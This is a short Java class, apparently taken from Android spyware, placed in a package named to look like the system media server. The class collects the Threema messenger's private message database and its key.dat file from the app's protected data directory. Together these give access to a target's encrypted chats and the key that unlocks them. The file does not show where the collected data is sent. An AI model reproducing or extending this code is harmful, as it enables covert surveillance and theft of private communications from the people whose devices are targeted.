package com.android.mediaserver.fetchers.apps;

import com.android.mediaserver.fetchers.FetchedFile;
import com.android.mediaserver.fetchers.file.FileFetcher;
import java.io.File;
import java.util.ArrayList;

public class ThreemaFetcher extends FileFetcher {
  public ThreemaFetcher() {
    this.mFetchedFiles = new ArrayList();
    this.mFetchedFiles.add(
        new FetchedFile(new File("/data/data/ch.threema.app/databases/threema.db"), "APP",
            "threema"));
    this.mFetchedFiles.add(
        new FetchedFile(new File("/data/data/ch.threema.app/files/key.dat"), "APP", "threema"));
  }
}
